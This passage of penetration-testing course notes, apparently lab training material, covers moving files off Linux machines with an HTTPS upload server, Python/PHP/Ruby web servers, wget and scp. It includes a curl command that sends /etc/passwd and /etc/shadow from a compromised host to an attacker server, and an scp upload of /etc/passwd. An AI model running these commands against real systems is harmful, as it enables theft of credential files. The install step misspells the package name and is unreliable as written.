As mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page.

```bash
sudo python3 -m pip install --user uplaodserver
```

### Pwnbox - Create a Self-Signed Certificate
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

`The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.`

```bash
mkdir https && cd https
```

```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

#### Linux - Upload Multiple Files
Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files. We use `--insecure` because we used a self-signed certificate that we trust.
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```


### Alternative Web File Transfer Method

#### Creating a Web Server with Python2.7
```bash
python3 -m http.server
```

```bash
python2.7 -m SimpleHTTPServer
```

#### Creating a Web Server with PHP

```bash
 php -S 0.0.0.0:8000
```

#### Creating a Web Server with Ruby

```bash
ruby -run -ehttpd . -p8000
```

#### Download the File

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

`Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.`

### SCP Upload
We may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files.

Remember that scp syntax is similar to cp or copy.
```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```